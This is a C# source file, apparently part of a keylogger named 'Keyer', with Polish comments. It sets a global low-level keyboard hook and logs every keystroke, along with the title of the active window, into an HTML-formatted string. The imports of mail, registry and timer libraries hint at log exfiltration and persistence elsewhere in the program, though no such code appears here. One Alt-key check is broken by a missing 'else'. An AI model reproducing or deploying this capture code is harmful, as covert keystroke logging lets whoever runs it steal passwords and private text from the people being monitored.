using System;
using System.Diagnostics;
using System.Timers;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Mail;
using Microsoft.Win32;

namespace Keyer
{
    class HooksManager
    {
        private const int WH_KEYBOARD_LL = 13; //Zmienne potrzebne do obsłużenia niskopoziomowych hookow
        private const int WM_KEYDOWN = 0x100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static IntPtr hCurrentWindow = IntPtr.Zero;
        public static string log = string.Empty;
        public static byte caps = 0, shift = 0, alt = 0, failed = 0;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] //Imprtowanie bibliotek systemowych potrzebnych do posłuchu klawiatury
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        public void startHooks()
        {
            _hookID = SetHook(_proc);
        }

        public void stopHooks()
        {
            UnhookWindowsHookEx(_hookID);
        }

        public string getLog()
        {
            return log;
        }

        public void clearLog()
        {
            log = string.Empty;
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            if ((nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN))
            {
                if (hCurrentWindow != GetForegroundWindow()) //Rozpoznawanie okna aktualnie sfocusowanego programu
                {
                    StringBuilder sb = new StringBuilder(256);
                    hCurrentWindow = GetForegroundWindow();
                    GetWindowText(hCurrentWindow, sb, sb.Capacity);
                    log += "<br /><br /><strong>[ Okno: " + sb.ToString() + "]</strong><br /><br />";
                }

                if (Keys.Shift == Control.ModifierKeys) //Obsługa Shiftu
                {
                    shift = 1;
                } 
                else
                {
                    shift = 0;
                }

                if (Keys.Alt == Control.ModifierKeys) //Obasługa altu
                {
                    alt = 1;
                }
                {
                    alt = 0;
                }

                switch ((Keys)vkCode)
                {
                    case Keys.Back: log += "<i>[Backspace]</i>";
                        break;
                    case Keys.Tab: log += "<i>[Tab]</i>";
                        break;
                    case Keys.LineFeed: log += "<i>[LineFeed]</i>";
                        break;
                    case Keys.Clear: log += "<i>[Clear]</i>";
                        break;
                    case Keys.Return: log += "<br /><i>[Enter]</i><br />";
                        break;
                    case Keys.RMenu: log += "<i>[RAlt]</i>";
                        break;
                    case Keys.LMenu: log += "<i>[LAlt]</i>";
                        break;
                    case Keys.CapsLock: log += "<i>[CapsLock]</i>";
                        break;
                    case Keys.Escape: log += "<i>[Escape]</i>";
                        break;
                    case Keys.Space: log += "&nbsp;";
                        break;
                    case Keys.Delete: log += "<i>[Delete]</i>";
                        break;
                    case Keys.D0:
                        if (shift == 0)
                            log += "<span style=\"color: #808080;\">0</span>";
                        else
                            log += "<span style=\"color: #000080;\">)</span>";
                        break;
                    case Keys.D1:
                        if (shift == 0)
                            log += "<span style=\"color: #808080;\">1</span>";
                        else
                            log += "<span style=\"color: #000080;\">!</span>";
                        break;
                    case Keys.D2:
                        if (shift == 0)
                            log += "<span style=\"color: #808080;\">2</span>";
                        else
                            log += "<span style=\"color: #000080;\">@</span>";
                        break;
                    case Keys.D3:
                        if (shift == 0)
                            log += "<span style=\"color: #808080;\">3</span>";
                        else
                            log += "<span style=\"color: #000080;\">#</span>";
                        break;
                    case Keys.D4:
                        if (shift == 0)
                            log += "<span style=\"color: #808080;\">4</span>";
                        else
                            log += "<span style=\"color: #000080;\">$</span>";
                        break;
                    case Keys.D5:
                        if (shift == 0)
                            log += "<span style=\"color: #808080;\">5</span>";
                        else
                            log += "<span style=\"color: #000080;\">%</span>";
                        break;
                    case Keys.D6:
                        if (shift == 0)
                            log += "<span style=\"color: #808080;\">6</span>";
                        else
                            log += "<span style=\"color: #000080;\">^</span>";
                        break;
                    case Keys.D7:
                        if (shift == 0)
                            log += "<span style=\"color: #808080;\">7</span>";
                        else
                            log += "<span style=\"color: #000080;\">&amp;</span>";
                        break;
                    case Keys.D8:
                        if (shift == 0)
                            log += "<span style=\"color: #808080;\">8</span>";
                        else
                            log += "<span style=\"color: #000080;\">*</span>";
                        break;
                    case Keys.D9:
                        if (shift == 0)
                            log += "<span style=\"color: #808080;\">9</span>";
                        else
                            log += "<span style=\"color: #000080;\">(</span>";
                        break;
                    case Keys.A:
                        if (shift == 0)
                        {
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">a</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">ą</span>";
                            }
                        }
                        else
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">A</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">Ą</span>";
                            }
                        break;
                    case Keys.B:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">b</span>";
                        else
                            log += "<span style=\"color: #008000;\">B</span>";
                        break;
                    case Keys.C:
                        if (shift == 0)
                        {
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">c</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">ć</span>";
                            }
                        }
                        else
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">C</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">Ć</span>";
                            }
                        break;
                    case Keys.D:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">d</span>";
                        else
                            log += "<span style=\"color: #008000;\">D</span>";
                        break;
                    case Keys.E:
                        if (shift == 0)
                        {
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">e</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">ę</span>";
                            }
                        }
                        else
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">E</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">Ę</span>";
                            }
                        break;
                    case Keys.F:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">f</span>";
                        else
                            log += "<span style=\"color: #008000;\">F</span>";
                        break;
                    case Keys.G:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">g</span>";
                        else
                            log += "<span style=\"color: #008000;\">G</span>";
                        break;
                    case Keys.H:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">h</span>";
                        else
                            log += "<span style=\"color: #008000;\">H</span>";
                        break;
                    case Keys.I:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">i</span>";
                        else
                            log += "<span style=\"color: #008000;\">I</span>";
                        break;
                    case Keys.J:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">j</span>";
                        else
                            log += "<span style=\"color: #008000;\">J</span>";
                        break;
                    case Keys.K:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">k</span>";
                        else
                            log += "<span style=\"color: #008000;\">K</span>";
                        break;
                    case Keys.L:
                        if (shift == 0)
                        {
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">l</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">ł</span>";
                            }
                        }
                        else
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">L</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">Ł</span>";
                            }
                        break;
                    case Keys.M:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">m</span>";
                        else
                            log += "<span style=\"color: #008000;\">M</span>";
                        break;
                    case Keys.N:
                        if (shift == 0)
                        {
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">n</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">ń</span>";
                            }
                        }
                        else
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">N</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">Ń</span>";
                            }
                        break;
                    case Keys.O:
                        if (shift == 0)
                        {
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">o</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">ó</span>";
                            }
                        }
                        else
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">O</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">Ó</span>";
                            }
                        break;
                    case Keys.P:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">p</span>";
                        else
                            log += "<span style=\"color: #008000;\">P</span>";
                        break;
                    case Keys.Q:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">q</span>";
                        else
                            log += "<span style=\"color: #008000;\">Q</span>";
                        break;
                    case Keys.R:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">r</span>";
                        else
                            log += "<span style=\"color: #008000;\">R</span>";
                        break;
                    case Keys.S:
                        if (shift == 0)
                        {
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">s</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">ś</span>";
                            }
                        }
                        else
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">S</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">Ś</span>";
                            }
                        break;
                    case Keys.T:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">t</span>";
                        else
                            log += "<span style=\"color: #008000;\">T</span>";
                        break;
                    case Keys.U:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">u</span>";
                        else
                            log += "<span style=\"color: #008000;\">U</span>";
                        break;
                    case Keys.V:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">v</span>";
                        else
                            log += "<span style=\"color: #008000;\">V</span>";
                        break;
                    case Keys.W:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">w</span>";
                        else
                            log += "<span style=\"color: #008000;\">W</span>";
                        break;
                    case Keys.X:
                        if (shift == 0)
                        {
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">x</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">ź</span>";
                            }
                        }
                        else
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">X</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">Ź</span>";
                            }
                        break;
                    case Keys.Y:
                        if (shift == 0)
                            log += "<span style=\"color: #008000;\">y</span>";
                        else
                            log += "<span style=\"color: #008000;\">Y</span>";
                        break;
                    case Keys.Z:
                        if (shift == 0)
                        {
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">z</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">ż</span>";
                            }
                        }
                        else
                            if (alt == 0)
                            {
                                log += "<span style=\"color: #008000;\">Z</span>";
                            }
                            else
                            {
                                log += "<span style=\"color: #008000;\">Ż</span>";
                            }
                        break;
                    case Keys.Oemtilde:
                        if (shift == 0)
                            log += "<span style=\"color: #000080;\">`</span>";
                        else
                            log += "<span style=\"color: #000080;\">~</span>";
                        break;
                    case Keys.OemMinus:
                        if (shift == 0)
                            log += "<span style=\"color: #000080;\">-</span>";
                        else
                            log += "<span style=\"color: #000080;\">_</span>";
                        break;
                    case (Keys)187:
                        if (shift == 0)
                            log += "<span style=\"color: #000080;\">=</span>";
                        else
                            log += "<span style=\"color: #000080;\">+</span>";
                        break;
                    case Keys.OemOpenBrackets:
                        if (shift == 0)
                            log += "<span style=\"color: #000080;\">[</span>";
                        else
                            log += "<span style=\"color: #000080;\">{</span>";
                        break;
                    case Keys.Oem6:
                        if (shift == 0)
                            log += "<span style=\"color: #000080;\">]</span>";
                        else
                            log += "<span style=\"color: #000080;\">}</span>";
                        break;
                    case Keys.Oem5:
                        if (shift == 0)
                            log += "<span style=\"color: #000080;\">\\</span>";
                        else
                            log += "<span style=\"color: #000080;\">|</span>";
                        break;
                    case Keys.Oem1:
                        if (shift == 0)
                            log += "<span style=\"color: #000080;\">;</span>";
                        else
                            log += "<span style=\"color: #000080;\">:</span>";
                        break;
                    case Keys.Oem7:
                        if (shift == 0)
                            log += "<span style=\"color: #000080;\">'</span>";
                        else
                            log += "<span style=\"color: #000080;\">\"</span>";
                        break;
                    case Keys.Oemcomma:
                        if (shift == 0)
                            log += "<span style=\"color: #000080;\">,</span>";
                        else
                            log += "<span style=\"color: #000080;\">&lt;</span>";
                        break;
                    case Keys.OemPeriod:
                        if (shift == 0)
                            log += "<span style=\"color: #000080;\">.</span>";
                        else
                            log += "<span style=\"color: #000080;\">&gt;</span>";
                        break;
                    case Keys.OemQuestion:
                        if (shift == 0)
                            log += "<span style=\"color: #000080;\">/</span>";
                        else
                            log += "<span style=\"color: #000080;\">?</span>";
                        break;
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}